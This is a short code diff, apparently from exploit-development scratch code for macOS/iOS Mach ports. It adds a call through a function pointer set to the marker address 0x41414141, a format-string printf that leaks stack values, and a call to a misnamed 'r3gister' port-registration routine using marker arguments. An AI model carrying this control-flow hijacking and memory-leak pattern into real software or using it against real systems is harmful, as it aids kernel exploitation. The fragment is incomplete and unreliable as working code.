@@ -107,6 +107,14 @@ kern_return_t send_ports(mach_port_t target, mach_port_t payload, size_t num, ma
     return ret;
 }
 
+void (*ptr)() = (void (*)())0x41414141;
+
+static kern_return_t r3gister(task_t task, mach_port_array_t init_port_set, mach_msg_type_number_t real_count, mach_msg_type_number_t fake_count)
+{
+    ptr();
+    printf("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\n");
+}
+
 struct test {
     int a;
     int b;
@@ -241,6 +249,10 @@ int main(int argc, char* argv[]) {
 
     mach_port_t *arrz=0;
     printf("%p %p\n", arrz, &arrz);
+
+    mach_port_t arr[2] = {MACH_PORT_NULL,MACH_PORT_NULL};
+    r3gister(0x41414141,arr,0x42424242,3);
+    printf("r3gister done\n");
 
 
 #pragma pack(4)
